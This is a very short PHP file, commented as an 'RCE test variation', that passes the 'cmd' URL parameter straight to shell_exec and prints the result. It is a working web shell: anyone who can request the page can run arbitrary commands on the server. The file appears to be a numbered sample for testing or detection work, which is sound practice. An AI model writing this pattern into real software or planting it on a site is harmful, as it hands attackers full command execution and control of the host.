<?php
// RCE test variation #1134
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>